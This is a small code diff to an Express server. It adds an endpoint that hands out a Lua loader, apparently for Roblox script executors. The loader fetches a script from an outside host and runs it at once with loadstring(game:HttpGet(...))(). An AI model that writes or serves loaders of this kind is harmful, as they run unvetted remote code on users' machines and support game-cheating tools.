@@ -729,6 +729,17 @@ app.post('/api/commands/:name/executed', async (req, res) => {
   }
 });
 
+// API: Get loader script (executed after main script)
+app.get('/api/loader', async (req, res) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  console.log('[LOADER] Request for loader script');
+  
+  const loaderScript = `SCRIPT_KEY = "keyless"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/1dc96643ea690cb216557c5b3ae4e94206849fd81ae27f546f46235ad2912c38/download"))()`;
+  
+  res.json({ success: true, code: loaderScript });
+});
+
 // Serve the frontend
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
